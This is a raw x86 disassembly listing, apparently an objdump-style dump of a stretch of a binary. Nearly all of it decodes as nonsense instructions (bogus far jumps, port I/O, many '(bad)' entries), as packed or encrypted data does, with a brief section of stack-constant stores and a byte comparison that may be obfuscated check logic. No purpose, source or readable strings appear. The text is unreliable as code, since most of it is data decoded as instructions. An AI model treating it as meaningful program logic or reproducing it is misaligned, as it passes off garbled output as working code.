  414151:	jnp    0x414190
  414153:	add    DWORD PTR [ebx],edx
  414155:	lds    edi,FWORD PTR [edx+edx*4-0x2c]
  414159:	mov    cl,0xb0
  41415b:	sbb    ch,BYTE PTR [eax+ebx*1]
  41415e:	sbb    al,dl
  414160:	adc    bl,BYTE PTR [eax]
  414162:	sbb    al,bl
  414164:	out    dx,al
  414165:	jo     0x414198
  414167:	popa   
  414168:	dec    ebp
  414169:	dec    ebp
  41416a:	jl     0x4141b7
  41416c:	jbe    0x414117
  41416e:	push   ecx
  41416f:	call   0xf0c0:0x6d08b0e6
  414176:	mov    bh,0x51
  414178:	mov    cl,0xc9
  41417a:	mov    BYTE PTR [ebp+edi*1-0x2b],cl
  41417e:	test   DWORD PTR [esi-0x17],eax
  414181:	jnp    0x414187
  414183:	and    eax,0xd9466b1b
  414188:	xor    DWORD PTR [esi+ebp*1],eax
  41418b:	outs   dx,DWORD PTR ds:[esi]
  41418c:	in     eax,dx
  41418d:	scas   al,BYTE PTR es:[edi]
  41418e:	rol    BYTE PTR [esi],0x2b
  414191:	(bad)  [edi+0x7c]
  414194:	sbb    eax,0xd8b2b4bd
  414199:	xor    cl,BYTE PTR [esi+edi*1]
  41419c:	sahf   
  41419d:	mov    eax,ds:0x83c56024
  4141a2:	icebp  
  4141a3:	aam    0x41
  4141a5:	mov    DWORD PTR [esp+ebx*2-0xf39af06],ecx
  4141ac:	jmp    0xb85b:0x33cdaa7b
  4141b3:	adc    BYTE PTR [edi],dl
  4141b5:	cmp    eax,0xb52ffd84
  4141ba:	mov    al,0x81
  4141bc:	cmp    al,0x19
  4141be:	addr16 retf 
  4141c0:	adc    al,0xa3
  4141c2:	xchg   ebp,eax
  4141c3:	fsub   QWORD PTR [eax-0x70]
  4141c6:	nop
  4141c7:	lock push ebp
  4141c9:	leave  
  4141ca:	imul   ebx,DWORD PTR [esi+0x6b],0xffffffe8
  4141ce:	(bad)  
  4141cf:	jne    0x4141e7
  4141d1:	std    
  4141d2:	push   edi
  4141d3:	imul   ecx,DWORD PTR [ecx],0xbd8770a9
  4141d9:	daa    
  4141da:	sahf   
  4141db:	xlat   BYTE PTR ds:[ebx]
  4141dc:	pop    edi
  4141dd:	in     al,dx
  4141de:	adc    DWORD PTR [edi],0xc3b66dc5
  4141e4:	(bad)  
  4141e5:	fmul   QWORD PTR [ecx-0x33]
  4141e8:	cs fist WORD PTR cs:[ebx+0x4]
  4141ed:	arpl   WORD PTR [ecx+0x5077057b],di
  4141f3:	dec    eax
  4141f4:	cli    
  4141f5:	arpl   bp,bp
  4141f7:	scas   al,BYTE PTR es:[edi]
  4141f8:	pop    ecx
  4141f9:	pop    ecx
  4141fa:	sub    al,0x4c
  4141fc:	div    BYTE PTR [eax+0x0]
  4141ff:	cld    
  414200:	sub    ecx,DWORD PTR [esi]
  414202:	sbb    eax,0x4b486467
  414207:	or     eax,0xf304738e
  41420c:	push   esi
  41420d:	retf   
  41420e:	mov    al,0xea
  414210:	pop    ds
  414211:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414212:	test   al,0xb6
  414214:	mov    dl,0xac
  414216:	nop
  414217:	mov    dl,0x5a
  414219:	jp     0x41422d
  41421b:	sahf   
  41421c:	push   ebp
  41421d:	cwde   
  41421e:	xchg   esp,eax
  41421f:	dec    edx
  414220:	mov    ch,0x80
  414222:	adc    DWORD PTR [ebp+0x44],esp
  414225:	mov    eax,0x3a306093
  41422a:	pop    esp
  41422b:	adc    cl,al
  41422d:	sbb    sp,bp
  414230:	ds cwde 
  414232:	inc    edx
  414233:	pop    esp
  414234:	lods   eax,DWORD PTR ds:[esi]
  414235:	and    DWORD PTR [ebx+0x21],ebx
  414238:	mov    ah,0x60
  41423a:	pop    edx
  41423b:	(bad)
  41423e:	test   eax,0x890ca03d
  414243:	mov    esp,0xc2f6f7d0
  414248:	icebp  
  414249:	nop
  41424a:	lods   al,BYTE PTR es:[esi]
  41424c:	jns    0x4141d2
  41424e:	hlt    
  41424f:	ins    BYTE PTR es:[edi],dx
  414250:	sbb    ah,bh
  414252:	js     0x414230
  414254:	jne    0x41424a
  414256:	shl    DWORD PTR [esi+0x525e30f3],0x9c
  41425d:	loop   0x41422a
  41425f:	test   BYTE PTR [edx+0x16],al
  414262:	adc    bl,ch
  414264:	mov    eax,ds:0xc2859934
  414269:	pusha  
  41426a:	jle    0x4142d5
  41426c:	add    bl,bh
  41426e:	stos   DWORD PTR es:[edi],eax
  41426f:	and    eax,0xa99471d9
  414274:	pop    esp
  414275:	cli    
  414276:	inc    edx
  414277:	mov    ah,BYTE PTR [edx+0x70153d5f]
  41427d:	xchg   DWORD PTR [ebx+0x65],ecx
  414280:	in     eax,0x55
  414282:	enter  0x8181,0x8c
  414286:	inc    eax
  414287:	arpl   WORD PTR [ebp+0x7b],bp
  41428a:	imul   esi,ebx,0x28
  41428d:	and    cl,BYTE PTR [ecx]
  41428f:	push   ebp
  414290:	outs   dx,DWORD PTR ds:[esi]
  414291:	push   es
  414292:	das    
  414293:	push   ebx
  414294:	stos   DWORD PTR es:[edi],eax
  414295:	imul   esp,DWORD PTR [esp+ebp*1-0x6d],0xffffff95
  41429a:	mov    ah,0xf5
  41429c:	imul   esp,DWORD PTR ds:0x8e39807c,0x40
  4142a3:	pop    ebx
  4142a4:	inc    ebp
  4142a5:	lds    edi,FWORD PTR [edx+0x47]
  4142a8:	jmp    0xcaad5370
  4142ad:	into   
  4142ae:	pop    ecx
  4142af:	pop    esi
  4142b0:	mov    dl,0x86
  4142b2:	mov    dl,0xe1
  4142b4:	retf   0xdc32
  4142b7:	jge    0x414266
  4142b9:	mov    BYTE PTR [eax],ch
  4142bb:	sbb    eax,0x744f63b0
  4142c0:	pop    eax
  4142c1:	int    0x44
  4142c3:	aad    0x57
  4142c5:	push   edx
  4142c6:	push   ecx
  4142c7:	inc    esi
  4142c8:	mul    BYTE PTR [esi+0x77]
  4142cb:	push   ebx
  4142cc:	mov    edi,0x511ca42f
  4142d1:	gs push es
  4142d3:	fs hlt 
  4142d5:	addr16 pop ebp
  4142d7:	xor    edx,esp
  4142d9:	xchg   ebx,eax
  4142da:	cmp    al,0xf6
  4142dc:	jle    0x414293
  4142de:	inc    edx
  4142df:	inc    esp
  4142e0:	inc    esi
  4142e1:	dec    esp
  4142e2:	add    al,0x5
  4142e4:	dec    esp
  4142e5:	pop    edi
  4142e6:	data16 sahf 
  4142e8:	mov    dh,BYTE PTR [esi-0x5e]
  4142eb:	inc    esi
  4142ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142ed:	nop
  4142ee:	jmp    0xa95161ae
  4142f3:	dec    esp
  4142f4:	xchg   edx,eax
  4142f5:	add    BYTE PTR [edx+ebp*4+0x71b350b2],ch
  4142fc:	pusha  
  4142fd:	mov    ch,0xb7
  4142ff:	pop    es
  414300:	adc    ebx,DWORD PTR [ecx-0x18]
  414303:	cmp    eax,0x6ede560
  414308:	sbb    BYTE PTR [eax-0x6e38a7b4],cl
  41430e:	cwde   
  41430f:	ja     0x414365
  414311:	lahf   
  414312:	pop    es
  414313:	mov    cl,0x38
  414315:	mov    esi,0xcee77ffa
  41431a:	cmp    DWORD PTR [edi-0x76],ecx
  41431d:	fimul  WORD PTR ds:0xa15938eb
  414323:	mov    dh,0xd4
  414325:	add    DWORD PTR ds:0x371d8834,esi
  41432b:	mov    dh,BYTE PTR [ebp+0x65]
  41432e:	add    BYTE PTR [ebx+0x0],0xff
  414332:	cmp    ch,dl
  414334:	stc    
  414335:	push   ds
  414336:	mov    cl,cl
  414338:	and    al,0x84
  41433a:	jl     0x4142fe
  41433c:	pop    eax
  41433d:	cdq    
  41433e:	addr16 inc ecx
  414340:	jb     0x414355
  414342:	test   eax,0xea7190af
  414347:	mov    dh,0x11
  414349:	jp     0x414324
  41434b:	sbb    DWORD PTR [ebp+0x4f],esp
  41434e:	dec    edi
  41434f:	(bad)  
  414350:	mov    WORD PTR [edi-0x6054bb0],fs
  414356:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414357:	or     BYTE PTR [edi],0xd7
  41435a:	mov    BYTE PTR [ebx+0x27bf9829],bl
  414360:	(bad)  
  414361:	stos   DWORD PTR es:[edi],eax
  414362:	cli    
  414363:	xchg   edx,eax
  414364:	ss mov ebx,0x6753924e
  41436a:	pop    edi
  41436b:	rcl    DWORD PTR [eax-0x31],0x98
  41436f:	icebp  
  414370:	sar    edi,cl
  414372:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414373:	jmp    0x68c3acad
  414378:	dec    ebp
  414379:	(bad)  
  41437a:	dec    ebx
  41437b:	fcmovnbe st,st(4)
  41437d:	aaa    
  41437e:	sub    al,0xf7
  414380:	and    al,al
  414382:	loopne 0x41436a
  414384:	cmp    eax,0xa1a94485
  414389:	(bad)  
  41438a:	(bad)  
  41438b:	mov    al,ds:0xbee2b85
  414390:	stos   BYTE PTR es:[edi],al
  414391:	(bad)  
  414393:	pop    edi
  414394:	imul   edx,DWORD PTR [edx+0x7277b204],0xffffffd6
  41439b:	lods   al,BYTE PTR ds:[esi]
  41439c:	sub    al,0x4b
  41439e:	fdivr  st(2),st
  4143a0:	sub    eax,DWORD PTR [esi-0x4d94a62]
  4143a6:	arpl   di,dx
  4143a8:	xlat   BYTE PTR ds:[ebx]
  4143a9:	xchg   esi,eax
  4143aa:	inc    esp
  4143ab:	adc    eax,0x173dab95
  4143b0:	popa   
  4143b1:	xlat   BYTE PTR ds:[ebx]
  4143b2:	add    DWORD PTR [edi-0x5f16c3cf],esp
  4143b8:	lahf   
  4143b9:	mov    DWORD PTR [ebp-0x55dac67b],ebp
  4143bf:	loope  0x4143bf
  4143c1:	pop    edi
  4143c2:	pop    edi
  4143c3:	push   esp
  4143c4:	add    DWORD PTR [eax],edi
  4143c6:	mov    edx,0x8a35e958
  4143cb:	nop
  4143cc:	lock into 
  4143ce:	call   0xdadd37a4
  4143d3:	push   edx
  4143d4:	nop
  4143d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4143d7:	jb     0x4143ab
  4143d9:	sahf   
  4143da:	bndldx bnd0,[edi+ebp*1+0x39]
  4143df:	mov    esi,0x155cf87f
  4143e4:	aad    0x2f
  4143e6:	test   ch,dh
  4143e8:	inc    ebx
  4143e9:	in     al,dx
  4143ea:	test   eax,0x440c5d13
  4143ef:	add    edi,DWORD PTR [ebx-0x6fa13d8c]
  4143f5:	mov    edx,eax
  4143f7:	jl     0x414407
  4143f9:	lea    esp,[esi+0x51]
  4143fc:	clc    
  4143fd:	(bad)  
  4143fe:	stos   BYTE PTR es:[edi],al
  4143ff:	inc    esi
  414400:	and    dl,bl
  414402:	push   ebp
  414403:	mov    dl,0x1d
  414405:	or     ah,BYTE PTR [eiz*1+0xf54c27e]
  41440c:	mov    bl,0x53
  41440e:	out    dx,al
  41440f:	and    eax,0x2249046b
  414414:	mov    bl,0x8f
  414416:	adc    eax,0x88fac2c
  41441b:	imul   ebx,DWORD PTR [ebp-0x10],0x53
  41441f:	pop    ebp
  414420:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414421:	xchg   BYTE PTR [eax],ah
  414423:	pop    ebp
  414424:	inc    edx
  414425:	inc    esi
  414426:	test   BYTE PTR [esi-0x40],al
  414429:	into   
  41442a:	push   ebp
  41442b:	ficomp WORD PTR [edi+ebp*2]
  41442e:	push   DWORD PTR [ecx+0x3f]
  414431:	push   ds
  414432:	inc    edx
  414433:	and    al,0x6b
  414435:	test   al,0x28
  414437:	mov    ah,0x5e
  414439:	dec    ecx
  41443a:	nop
  41443b:	mov    esi,db0
  41443e:	lods   al,BYTE PTR ds:[esi]
  41443f:	fdiv   QWORD PTR gs:[edi]
  414442:	sbb    esp,DWORD PTR [edx-0x19]
  414445:	ret    0xfc37
  414448:	cmc    
  414449:	mov    ah,0xc8
  41444b:	jnp    0x4144b9
  41444d:	shl    DWORD PTR [ebx+0x200bf247],cl
  414453:	imul   esp,DWORD PTR [edi],0xffffff83
  414456:	jp     0x414475
  414458:	lock mov ch,0x9c
  41445b:	loopne 0x41440c
  41445d:	ss add al,0xce
  414460:	dec    eax
  414461:	aad    0x61
  414463:	call   0x4f145c3f
  414468:	stos   BYTE PTR es:[edi],al
  414469:	pop    edx
  41446a:	icebp  
  41446b:	ins    BYTE PTR es:[edi],dx
  41446c:	imul   eax,DWORD PTR [edi+0x3340c606],0xfffffffc
  414473:	and    al,0xe3
  414475:	push   0x741502d8
  41447a:	imul   esp,DWORD PTR [ebx+edx*8-0x55],0xffffffc4
  41447f:	leave  
  414480:	mov    BYTE PTR [eax-0x59e48ed],ah
  414486:	shl    eax,cl
  414488:	(bad)  
  414489:	mov    ds:0x1d75ad1f,eax
  41448e:	stos   DWORD PTR es:[edi],eax
  41448f:	popa   
  414490:	add    al,0xf
  414492:	int3   
  414493:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414494:	repz mov gs,WORD PTR [edx-0x2c]
  414498:	mov    WORD PTR [esi+0x5755be57],cs
  41449e:	cmp    esi,DWORD PTR [ecx]
  4144a0:	xchg   DWORD PTR [edx+eiz*4-0x7be8ae70],esp
  4144a7:	rcl    DWORD PTR [ecx+0x10ab9975],cl
  4144ad:	popf   
  4144ae:	add    esi,DWORD PTR [esi]
  4144b0:	imul   eax,DWORD PTR [ebx-0x13],0xffffffdf
  4144b4:	sar    DWORD PTR [esi],1
  4144b6:	out    dx,al
  4144b7:	and    eax,0xab4eb308
  4144bc:	cwde   
  4144bd:	pop    edi
  4144be:	mov    edx,0x35db74a8
  4144c3:	pop    ebp
  4144c4:	xchg   edi,edi
  4144c6:	add    eax,0x79c1ba51
  4144cb:	pop    ds
  4144cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4144cd:	pop    esi
  4144ce:	loope  0x414522
  4144d0:	scas   eax,DWORD PTR es:[edi]
  4144d1:	cmp    ah,al
  4144d3:	dec    ebx
  4144d4:	mov    esp,0x2726bbef
  4144d9:	sub    BYTE PTR [ecx],bh
  4144db:	xchg   BYTE PTR [edx+0x24],ch
  4144de:	mov    esp,0x7221e271
  4144e3:	leave  
  4144e4:	inc    eax
  4144e5:	ret    0x579a
  4144e8:	xchg   ecx,eax
  4144e9:	fs xor ebx,esi
  4144ec:	pop    eax
  4144ed:	inc    ebx
  4144ee:	sbb    BYTE PTR [edx+0x3b008ce6],cl
  4144f4:	sub    BYTE PTR [ebp-0x2],0x83
  4144f8:	repnz ss ins DWORD PTR es:[edi],dx
  4144fb:	mov    BYTE PTR [eax-0x1f33778e],dh
  414501:	int    0x48
  414503:	popa   
  414504:	test   DWORD PTR [ebx],0x39daa55d
  41450a:	add    bh,al
  41450c:	inc    ebp
  41450d:	clc    
  41450e:	add    al,0x32
  414510:	add    BYTE PTR [eax],al
  414512:	mov    DWORD PTR [ebp-0x4],0x62ea
  414519:	mov    DWORD PTR [ebp-0x38],0x58e9
  414520:	mov    DWORD PTR [ebp-0x34],0x7f89
  414527:	mov    DWORD PTR [ebp-0x30],0x7fda
  41452e:	mov    DWORD PTR [ebp-0x2c],0x2889
  414535:	mov    DWORD PTR [ebp-0x28],0xf0f
  41453c:	mov    DWORD PTR [ebp-0x24],0x58e1
  414543:	mov    DWORD PTR [ebp-0x3c],0x69c
  41454a:	mov    eax,DWORD PTR [ebp-0x10]
  41454d:	mov    ecx,DWORD PTR [ebp-0x14]
  414550:	and    al,0xb9
  414552:	add    al,cl
  414554:	mov    ecx,DWORD PTR [ebp-0x18]
  414557:	and    al,cl
  414559:	mov    ecx,DWORD PTR [ebp-0x1c]
  41455c:	sub    al,0x11
  41455e:	and    al,cl
  414560:	mov    ecx,DWORD PTR [ebp-0x20]
  414563:	mov    edx,DWORD PTR [ebp+0x8]
  414566:	imul   ecx,ecx,0x6008
  41456c:	add    ecx,0x1759dd6e
  414572:	add    al,0x4d
  414574:	xor    ecx,0x2b4185ee
  41457a:	cmp    BYTE PTR [ecx+edx*1],al
  41457d:	jne    0x414da1
  414583:	jmp    0x414948
  414588:	push   cs
  414589:	mov    WORD PTR [edi],gs
  41458b:	dec    edx
  41458c:	sub    ch,BYTE PTR [edx]
  41458e:	jmp    0xe67c:0x73623c4c
  414595:	add    al,0x0
  414597:	mov    esi,0x181824d2
  41459c:	rcl    BYTE PTR [edx],1
  41459e:	sbb    BYTE PTR [eax],bl
  4145a0:	mov    BYTE PTR [eax+0x546cf8ad],dh
  4145a6:	outs   dx,DWORD PTR ds:[esi]
  4145a7:	shl    BYTE PTR [edi+eax*4+0xfa053f6],0x2
  4145af:	jne    0x4145bf
  4145b1:	cmp    ah,BYTE PTR ds:0x1f891c52
  4145b7:	cmp    al,0x3b
  4145b9:	sbb    al,0x6a
  4145bb:	xor    eax,0xff81ae94
  4145c0:	pop    ecx
  4145c1:	bound  ebx,QWORD PTR [esp+ecx*4]
  4145c4:	lds    esi,FWORD PTR [ecx-0x8]
  4145c7:	or     al,0xa0
  4145c9:	lahf   
  4145ca:	(bad)  
  4145cb:	frstor ds:0xc737085a
  4145d1:	addr16 js 0x4145f9
  4145d4:	fwait
  4145d5:	cmovle ebx,esp
  4145d8:	mov    esp,0xb641317f
  4145dd:	xchg   edi,eax
  4145de:	adc    al,0xce
  4145e0:	lods   al,BYTE PTR ds:[esi]
  4145e1:	push   0x25
  4145e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145e4:	mov    ecx,0xda1d66c
  4145e9:	sub    al,al
  4145eb:	test   al,0x2b
  4145ed:	pop    ss
  4145ee:	test   DWORD PTR [edi+edi*2+0x64e5d181],edi
  4145f5:	(bad)  
  4145f6:	jmp    0xc441:0x2249dfaf
  4145fd:	push   esp
  4145fe:	setae  BYTE PTR [esi+0x457c9466]
  414605:	pop    edx
  414606:	es icebp 
  414608:	pop    ss
  414609:	pop    edx
  41460a:	mov    bh,0x30
  41460c:	inc    edi
  41460d:	push   ecx
  41460e:	mov    bl,0x32
  414610:	ds cs loopne 0x414645
  414614:	add    eax,0x8d00b395
  414619:	je     0x414694
  41461b:	cld    
  41461c:	inc    esi
  41461d:	push   cs
  41461e:	cld    
  41461f:	enter  0x8507,0x4f
  414623:	sub    DWORD PTR [ebx],ecx
  414625:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414626:	sahf   
  414627:	cwde   
  414628:	lock fs lahf 
  41462b:	pusha  
  41462c:	push   eax
  41462d:	enter  0xf2e7,0x1c
  414631:	cmp    bl,BYTE PTR [esp+ebx*1+0xb82cef6]
  414638:	(bad)  
  414639:	sbb    eax,0x2e45dea3
  41463e:	inc    edx
  41463f:	nop
  414640:	xlat   BYTE PTR ds:[ebx]
  414641:	fwait
  414642:	cmc    
  414643:	jge    0x414616
  414645:	add    eax,0x4de3f4f5
  41464a:	push   ecx
  41464b:	and    al,BYTE PTR [eax+eax*8+0x1c]
  41464f:	mov    ah,0xf8
  414651:	repz cmp BYTE PTR ds:0x3a994015,ah
  414658:	(bad)  
  414659:	sbb    eax,DWORD PTR [edi-0x27aa3e51]
  41465f:	add    ebp,DWORD PTR [edx]
  414661:	int    0x92
  414663:	cmp    edi,DWORD PTR ds:[edi+ecx*1]
  414667:	add    ah,BYTE PTR [edx+0x4e47f2e9]
  41466d:	sub    bh,BYTE PTR [ecx-0x38fad0a5]
  414673:	stos   DWORD PTR es:[edi],eax
  414674:	aas    
  414675:	mov    cl,0x78
  414677:	mov    dh,0x27
  414679:	mov    esp,DWORD PTR [ebx+0x72c145fe]
  41467f:	call   0x2201:0xcc7412bd
  414686:	popf   
  414687:	test   eax,0x527c91bb
  41468c:	sbb    DWORD PTR [ecx],ebp
  41468e:	push   0xffffffca
  414690:	and    ebp,DWORD PTR [ecx+ebp*1-0x33]
  414694:	push   ds
  414695:	and    DWORD PTR [edi+0x1b41f78a],eax
  41469b:	bound  ebx,QWORD PTR [ebp+0x3b]
  41469e:	xor    BYTE PTR [eax-0x3b593572],cl
  4146a4:	ret    
  4146a5:	mov    ds:0xd14bbe72,al
  4146aa:	pushf  
  4146ab:	mov    dl,0x7c
  4146ad:	jae    0x4146d7
  4146af:	jle    0x414661
  4146b1:	hlt    
  4146b2:	std    
  4146b3:	or     BYTE PTR [ebx-0x67],ch
  4146b6:	cs daa 
  4146b8:	out    dx,al
  4146b9:	add    eax,DWORD PTR [ebx]
  4146bb:	jno    0x414719
  4146bd:	in     al,0x7f
  4146bf:	js     0x41473a
  4146c1:	adc    edx,DWORD PTR [ecx-0x1f851ec4]
  4146c7:	fld    QWORD PTR [ebp-0x3a]
  4146ca:	cmc    
  4146cb:	lock inc esp
  4146cd:	dec    ecx
  4146ce:	ror    BYTE PTR [ebp+0x5bb83ed6],cl
  4146d4:	inc    eax
  4146d5:	and    edi,DWORD PTR [ebp+eiz*1-0x58]
  4146d9:	jmp    0xc91613e1
  4146de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146df:	cmp    al,0xde
  4146e1:	and    al,BYTE PTR [ecx-0x15]
  4146e4:	lods   ax,WORD PTR ds:[esi]
  4146e6:	outs   dx,DWORD PTR ds:[esi]
  4146e7:	fbld   TBYTE PTR [esi-0x24]
  4146ea:	pop    ebx
  4146eb:	jmp    0x68a7774f
  4146f0:	dec    ebx
  4146f1:	adc    eax,0x7109e113
  4146f6:	loop   0x41473a
  4146f8:	xor    al,0x26
  4146fa:	push   ss
  4146fb:	into   
  4146fc:	std    
  4146fd:	popa   
  4146fe:	mov    DWORD PTR [eax],ebp
  414700:	sub    al,bl
  414702:	fcom   QWORD PTR [edx]
  414704:	fsubr  DWORD PTR [ebp+0x55700c8a]
  41470a:	pop    ss
  41470b:	sbb    eax,0x5cb69d94
  414710:	cld    
  414711:	fiadd  WORD PTR [edx+0x3bac60e0]
  414717:	(bad)  
  414719:	imul   DWORD PTR [ebx]
  41471b:	imul   ebx,DWORD PTR [eax+0x38c4c89a],0xb0896eb
  414725:	or     al,0x56
  414727:	pop    eax
  414728:	push   ebx
  414729:	arpl   dx,bx
  41472b:	mov    WORD PTR [edi+0x66e9f5c6],cs
  414731:	lods   al,BYTE PTR ds:[esi]
  414732:	sbb    edx,DWORD PTR [ebx-0x20]
  414735:	pop    eax
  414736:	out    0x26,al
  414738:	(bad)  
  414739:	aad    0x11
  41473b:	sbb    ebp,DWORD PTR [edx]
  41473d:	stc    
  41473e:	fdiv   QWORD PTR [eax]
  414740:	push   0x35
  414742:	ins    DWORD PTR es:[edi],dx
  414743:	xor    ebx,DWORD PTR [edi]
  414745:	adc    al,0x1e
  414747:	jge    0x4147b5
  414749:	in     al,dx
  41474a:	jle    0x41471c
  41474c:	(bad)  
  41474d:	pop    ecx
  41474e:	les    ecx,FWORD PTR [esi]
  414750:	jb     0x414790
  414752:	(bad)  
  414754:	gs xchg ecx,eax
  414756:	call   0x89de:0x4663b4ee
  41475d:	loopne 0x4147ae
  41475f:	out    0xd,eax
  414761:	xchg   esi,eax
  414762:	faddp  st(5),st
  414764:	test   BYTE PTR [eax],al
  414766:	push   ds
  414767:	sbb    ch,BYTE PTR [eax]
  414769:	push   esp
  41476a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41476b:	arpl   WORD PTR [ecx],di
  41476d:	inc    edi
  41476e:	ins    BYTE PTR es:[edi],dx
  41476f:	adc    edi,DWORD PTR [eax+0x74836246]
  414775:	repz fmul DWORD PTR [esp+edx*4-0x1d]
  41477a:	jmp    0xe34f:0x6a9be903
  414781:	push   edi
  414782:	and    DWORD PTR [edx+0x11b5c45d],esp
  414788:	cmp    BYTE PTR [ecx],dl
  41478a:	(bad)  [edx-0x62]
  41478d:	mov    ebx,0xa63415be
  414792:	out    0x6c,al
  414794:	push   esp
  414795:	enter  0xc707,0xd0
  414799:	div    BYTE PTR [ecx+0x4dc5b966]
  41479f:	jns    0x414750
  4147a1:	dec    ecx
  4147a2:	cmp    bh,BYTE PTR [eax+0x10]
  4147a5:	mov    ?,WORD PTR [edx-0x6b]
  4147a8:	cli    
  4147a9:	cmp    dl,al
  4147ab:	ins    BYTE PTR es:[edi],dx
  4147ac:	cmp    cl,al
  4147ae:	fild   WORD PTR [ebx-0x18]
  4147b1:	mov    ecx,0x89592fec
  4147b6:	mov    al,0x3f
  4147b8:	ret    
  4147b9:	add    DWORD PTR [ecx-0x1ac04199],ebp
  4147bf:	mov    ebp,0x62300d6
  4147c4:	push   ss
  4147c5:	add    al,0x1c
  4147c7:	add    al,BYTE PTR [esi-0x734e5e50]
  4147cd:	mov    WORD PTR [edx-0x4616198b],ds
  4147d3:	push   0x1b5633ff
  4147d8:	mov    al,0x15
  4147da:	fcom   st(2)
  4147dc:	adc    BYTE PTR [ebp-0x11],ch
  4147df:	mov    al,ds:0x7193f925
  4147e4:	xor    al,0x12
  4147e6:	lds    ebx,FWORD PTR [edx]
  4147e8:	mov    ebp,0x517c5e57
  4147ed:	cmp    ah,cl
  4147ef:	leave  
  4147f0:	(bad)  
  4147f1:	sub    DWORD PTR [eax+edx*8],edi
  4147f4:	inc    ebx
  4147f5:	clc    
  4147f6:	das    
  4147f7:	mov    ds:0xeab0125d,eax
  4147fc:	jmp    0xe0ba:0x69cde7dd
  414803:	leave  
  414804:	daa    
  414805:	xor    ch,0xfe
  414808:	cmp    BYTE PTR [ebx-0x77a75252],cl
  41480e:	popa   
  41480f:	std    
  414810:	xchg   DWORD PTR [edi],ebx
  414812:	int    0x3c
  414814:	(bad)  
  414815:	stos   DWORD PTR es:[edi],eax
  414816:	push   ecx
  414817:	lods   al,BYTE PTR ds:[esi]
  414818:	mov    ch,0x32
  41481a:	sahf   
  41481b:	(bad)  
  41481c:	and    eax,0x2aed5c71
  414821:	or     eax,0xe98f02a7
  414826:	je     0x41480a
  414828:	push   ebx
  414829:	lds    edx,FWORD PTR [eax]
  41482b:	xchg   edi,eax
  41482c:	stos   BYTE PTR es:[edi],al
  41482d:	add    ebx,ebp
  41482f:	or     DWORD PTR [esi+eiz*1+0x3a56cc9d],0xfffffffc
  414837:	or     al,0x26
  414839:	jns    0x4147bb
  41483b:	js     0x4147e3
  41483d:	leave  
  41483e:	aad    0xb0
  414840:	ins    DWORD PTR es:[edi],dx
  414841:	sbb    eax,0x88287b6a
  414846:	push   ds
  414847:	jg     0x4148af
  414849:	and    al,0x25
  41484b:	dec    edi
  41484c:	lods   al,BYTE PTR ds:[esi]
  41484d:	jb     0x414854
  41484f:	out    0x6c,eax
  414851:	push   0x6111e831
  414856:	add    ebx,DWORD PTR [esi]
  414858:	rcl    ch,1
  41485a:	mov    bl,0xe0
  41485c:	xor    al,0xfa
  41485e:	xor    DWORD PTR fs:[eax-0x17],edi
  414862:	inc    ebp
  414863:	ret    
  414864:	stos   DWORD PTR es:[edi],eax
  414865:	daa    
  414866:	sti    
  414867:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414868:	mov    eax,0x6db4cee2
  41486d:	inc    esi
  41486e:	loope  0x4148a9
  414870:	xor    eax,0x6dde73ac
  414875:	mov    BYTE PTR [eax],bh
  414877:	xor    ah,0xbb
  41487a:	dec    edx
  41487b:	(bad)  
  41487c:	call   0xe913:0xa1a08935
  414883:	inc    ecx
  414884:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414885:	mov    esi,0x2a2a0e
  41488a:	mov    al,ds:0x941d8e8c
  41488f:	ins    BYTE PTR es:[edi],dx
  414890:	lahf   
  414891:	lea    ecx,[esi-0x43]
  414894:	test   eax,0x3af569f7
  414899:	jl     0x4148be
  41489b:	mov    edx,0x67dea728
  4148a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148a1:	repz mov esp,0xb26d834a
  4148a7:	mov    dh,bl
  4148a9:	popa   
  4148aa:	inc    edx
  4148ab:	imul   ebx,esp,0x20da99a
  4148b1:	and    DWORD PTR [ebx],eax
  4148b3:	ds mov esi,0xaf6b0cce
  4148b9:	xchg   esi,eax
  4148ba:	(bad)  
  4148bb:	stc    
  4148bc:	jnp    0x4148ee
  4148be:	push   0x9035aad1
  4148c3:	mov    edx,0x12faef0c
  4148c8:	jo     0x4148db
  4148ca:	call   0x4079:0xc9e83b92
  4148d1:	std    
  4148d2:	or     cl,BYTE PTR [ebx+edx*4-0x11]
  4148d6:	cdq    
  4148d7:	pop    esi
  4148d8:	pop    ecx
  4148d9:	and    edi,DWORD PTR [ecx]
  4148db:	fldcw  WORD PTR [edx-0x40e0524a]
  4148e1:	aas    
  4148e2:	inc    ecx
  4148e3:	and    ah,dl
  4148e5:	mov    dl,0x21
  4148e7:	push   ss
  4148e8:	inc    eax
  4148e9:	mov    ebx,0xdbcce029
  4148ee:	in     al,dx
  4148ef:	cwde   
  4148f0:	xor    esp,eax
  4148f2:	jg     0x414891
  4148f4:	inc    edi
  4148f5:	pop    ebp
  4148f6:	mov    ah,0x76
  4148f8:	test   eax,0x8075d68e
  4148fd:	(bad)  
  4148fe:	pop    ds
  4148ff:	inc    ebp
  414900:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414901:	test   eax,0x8e410be3
  414906:	fldcw  WORD PTR [edx-0x64]
  414909:	xor    BYTE PTR [ebx-0x1d75829d],ch
  41490f:	mov    eax,0x6b75552d
  414914:	adc    bl,BYTE PTR [esi+ebp*8+0x20]
  414918:	test   eax,0x1e1041e6
  41491d:	fimul  WORD PTR [bp-0x2115]
  414922:	fstp   QWORD PTR [eax-0x2a600fdb]
  414928:	dec    ebp
  414929:	gs fs push cs
  41492c:	jns    0x41490d
  41492e:	and    eax,0x64a4163
  414933:	ins    DWORD PTR es:[edi],dx
